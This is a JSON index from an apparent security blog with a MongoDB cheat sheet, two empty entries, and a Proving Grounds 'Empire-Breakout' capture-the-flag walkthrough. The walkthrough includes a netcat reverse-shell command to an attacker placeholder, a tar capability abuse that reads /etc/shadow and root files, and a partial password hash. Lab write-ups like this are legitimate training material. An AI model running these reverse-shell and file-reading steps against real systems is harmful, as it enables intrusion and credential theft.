[
  
  {
    "title": "Hack The Box: Soccer Walkthrough",
    "url": "/htb/2023/03/03/hack-the-box-soccer-walkthrough.html",
    "categories": "HTB",
    "tags": "CTF",
    "date": "2023-03-03 19:47:00 +0530",
    





    
    "snippet": "IntroductionplaceholderNmap",
    "content": "IntroductionplaceholderNmap"
  },
  
  {
    "title": "Proving Grounds Labs: Empire-Breakout Walkthrough",
    "url": "/offseclabs/2023/03/03/proving-grounds-labs-empire-breakout-walkthrough.html",
    "categories": "OffsecLabs",
    "tags": "CTF",
    "date": "2023-03-03 13:09:00 +0530",
    





    
    "snippet": "IntroductionEasy machine from Proving Grounds Labs (FREE), basic enumeration, decryption and linux capability privsec.NmapFirst we start with Nmap scan as we can see 3 ports are open 80, 10000, 200...",
    "content": "IntroductionEasy machine from Proving Grounds Labs (FREE), basic enumeration, decryption and linux capability privsec.NmapFirst we start with Nmap scan as we can see 3 ports are open 80, 10000, 20000. on oirt 80 there is a default apache page and rest of 2 ports are running MiniServ service if we can get username and password we will get shell for sure. I alos did all ports scan but didnt got anything but same result, so lets move further.&gt; nmap -sC -sV -T4 192.168.173.238 -oN nmap/scan_1Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-03 13:30 ISTNmap scan report for 192.168.173.238Host is up (0.14s latency).Not shown: 997 closed tcp ports (conn-refused)PORT      STATE SERVICE VERSION80/tcp    open  http    Apache httpd 2.4.51 ((Debian))|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.51 (Debian)10000/tcp open  http    MiniServ 1.981 (Webmin httpd)|_http-title: 200 &amp;mdash; Document follows20000/tcp open  http    MiniServ 1.830 (Webmin httpd)|_http-title: 200 &amp;mdash; Document follows|_http-server-header: MiniServ/1.830Web Directory BruteForcenothing interesting here, but lets check sourcecode of index.html page which is the default apache page on port 80&gt; dirsearch -u http://192.168.173.238  _|. _ _  _  _  _ _|_    v0.4.2 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/kali/.dirsearch/reports/192.168.173.238/-_23-03-03_15-05-00.txtError Log: /home/kali/.dirsearch/logs/errors-23-03-03_15-05-00.logTarget: http://192.168.173.238/[15:05:00] Starting: [15:05:35] 200 -   11KB - /index.html[15:05:39] 301 -  319B  - /manual  -&gt;  http://192.168.173.238/manual/[15:05:39] 200 -  676B  - /manual/index.htmlDecoding&lt;!--don't worry no one will get here, it's safe to share with you my access. Its encrypted :)++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.--&gt;Decoded: \".2uqPEfj3D&lt;P'a-3\"after schrolling down little bit i we get one comment, and somthing is encrypted here which is brainfuck encryption les decode this with any online decode and we get one password ‘*******’, now we got 2 login forms and a password we try to login in both forms, on port 20000 we can login as “cyber” user.Shellnow this is very simple just click on shell icon and web shell GUI will open run any reverse shell command and get a shell on you machine and stabalize. I used simple netcat shell.# ON TARGET$ nc &lt;attacker-ip&gt; &lt;attacker-port&gt; -e /bin/bash# ON attacker machine$ rlwrap nc -lvnp &lt;port&gt;ROOTcyber@breakout:~$ ls ls -la tar-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar#to check capablitiescyber@breakout:~$ getcap -r / 2&gt;/dev/null/home/cyber/tar cap_dac_read_search=ep/usr/bin/ping cap_net_raw=epAfter getting shell we can read user flag, no les get to root, there is a tar binary in our home directory and if we check capablities we can see tar binary, in this we can try to read /etc/shadow.  compress /etc/shadow to tar  get .tar file in current directory  extarct .tar and read shadowezz :)cyber@breakout:~$ ls lslslocal.txt  tarcyber@breakout:~$ ./tar -cvf shadow.tar /etc/shadowcyber@breakout:~$ lslocal.txt  shadow.tar  tarcyber@breakout:~$ tar -xf shadow.tarcyber@breakout:~$ lsetc  local.txt  shadow.tar  tarcyber@breakout:~$ cat etc/shadowroot:$y$j9T$eJzu0TYuqGwZThJJzbP6o.$Xs23PV9/...daemon:*:18919:0:99999:7:::bin:*:18919:0:99999:7:::sys:*:18919:0:99999:7:::sync:*:18919:0:99999:7:::games:*:18919:0:99999:7:::man:*:18919:0:99999:7:::lp:*:18919:0:99999:7:::mail:*:18919:0:99999:7:::....and we can read root files now, so les read root flag now but i dont know the name of the file in which flag is stored ;) so les compress whole root directory ezzcyber@breakout:~$ ./tar -cvf root.tar /root./tar -cvf root.tar /root/root//root/.tmp//root/.spamassassin//root/.bash_history/root/.profile/root/.bashrc/root/.usermin//root/.usermin/procmail//root/.usermin/mailbox//root/.usermin/mailbox/dsnreplies.pag/root/.usermin/mailbox/dsnreplies.dir/root/.usermin/mailbox/delreplies.dir/root/.usermin/mailbox/delreplies.pag/root/.usermin/spam//root/.usermin/filter//root/.local//root/.local/share//root/.local/share/nano//root/proof.txtcyber@breakout:~$ tar -xf root.tartar -xf root.tarcyber@breakout:~$ ls root/ls root/proof.txtcyber@breakout:~$ cat root/proof.txtcat root/proof.txta2d********fband we got the root flag but wait we need root shell, les read root users bash_history file and as we can see there is a .bak file in backups directory but only root user can read that, but wait we can read :) with tar les compress that .bak file.cyber@breakout:~/root$ cat .bash_historycat .bash_historyclearnano /var/backups/.old_pass.bak cat /var/backups/.old_pass.bak chmod 600 /var/backups/.old_pass.bakls -laclearcd ../var/backups/ ....... cyber@breakout:~$ ./t./tar -cvf lol.tar /var/backups/.old_pass.bak./tar -cvf lol.tar /var/backups/.old_pass.bak/var/backups/.old_pass.bakcyber@breakout:~$ tar -xf lol.tartar -xf lol.tarcyber@breakout:~$ lslsetc  local.txt  lol.tar  root  root.tar  shadow.tar  tar  varcyber@breakout:~$ cat var/backups/.old_pass.bakcat var/backups/.old_pass.bak\"Ts********X(=~h\"and we got one more password les su to root user with this passwordcyber@breakout:~$ su su rootsu rootPassword: \"Ts********X(=~h\"root@breakout:/home/cyber# cd    cdcdroot@breakout:~# whoamiwhoamiwhoamirootand we are root :)"
  },
  
  {
    "title": "Hack The Box: Stocker Walkthrough",
    "url": "/2023/03/02/hack-the-box-stocker-walkthrough.html",
    "categories": "",
    "tags": "",
    "date": "2023-03-02 01:16:00 +0530",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "MongoDB cheetsheet",
    "url": "/dbms/2023/02/28/mongodb-cheetsheet.html",
    "categories": "DBMS",
    "tags": "MongoDB",
    "date": "2023-02-28 12:49:00 +0530",
    





    
    "snippet": "MongoDB Cheat SheetShow All Databasesshow dbsShow Current DatabasedbCreate Or Switch Databaseuse acmeDropdb.dropDatabase()Create Collectiondb.createCollection('posts')Show Collectionsshow collectio...",
    "content": "MongoDB Cheat SheetShow All Databasesshow dbsShow Current DatabasedbCreate Or Switch Databaseuse acmeDropdb.dropDatabase()Create Collectiondb.createCollection('posts')Show Collectionsshow collectionsInsert Rowdb.posts.insert({  title: 'Post One',  body: 'Body of post one',  category: 'News',  tags: ['news', 'events'],  user: {    name: 'John Doe',    status: 'author'  },  date: Date()})Insert Multiple Rowsdb.posts.insertMany([  {    title: 'Post Two',    body: 'Body of post two',    category: 'Technology',    date: Date()  },  {    title: 'Post Three',    body: 'Body of post three',    category: 'News',    date: Date()  },  {    title: 'Post Four',    body: 'Body of post three',    category: 'Entertainment',    date: Date()  }])Get All Rowsdb.posts.find()Get All Rows Formatteddb.posts.find().pretty()Find Rowsdb.posts.find({ category: 'News' })Sort Rows# ascdb.posts.find().sort({ title: 1 }).pretty()# descdb.posts.find().sort({ title: -1 }).pretty()Count Rowsdb.posts.find().count()db.posts.find({ category: 'news' }).count()Limit Rowsdb.posts.find().limit(2).pretty()Chainingdb.posts.find().limit(2).sort({ title: 1 }).pretty()Foreachdb.posts.find().forEach(function(doc) {  print(\"Blog Post: \" + doc.title)})Find One Rowdb.posts.findOne({ category: 'News' })Find Specific Fieldsdb.posts.find({ title: 'Post One' }, {  title: 1,  author: 1})Update Rowdb.posts.update({ title: 'Post Two' },{  title: 'Post Two',  body: 'New body for post 2',  date: Date()},{  upsert: true})Update Specific Fielddb.posts.update({ title: 'Post Two' },{  $set: {    body: 'Body for post 2',    category: 'Technology'  }})Increment Field ($inc)db.posts.update({ title: 'Post Two' },{  $inc: {    likes: 5  }})Rename Fielddb.posts.update({ title: 'Post Two' },{  $rename: {    likes: 'views'  }})Delete Rowdb.posts.remove({ title: 'Post Four' })Sub-Documentsdb.posts.update({ title: 'Post One' },{  $set: {    comments: [      {        body: 'Comment One',        user: 'Mary Williams',        date: Date()      },      {        body: 'Comment Two',        user: 'Harry White',        date: Date()      }    ]  }})Find By Element in Array ($elemMatch)db.posts.find({  comments: {     $elemMatch: {       user: 'Mary Williams'       }    }  })Add Indexdb.posts.createIndex({ title: 'text' })Text Searchdb.posts.find({  $text: {    $search: \"\\\"Post O\\\"\"    }})Greater &amp; Less Thandb.posts.find({ views: { $gt: 2 } })db.posts.find({ views: { $gte: 7 } })db.posts.find({ views: { $lt: 7 } })db.posts.find({ views: { $lte: 7 } })Creditshttps://gist.github.com/bradtraversy"
  }
  
]

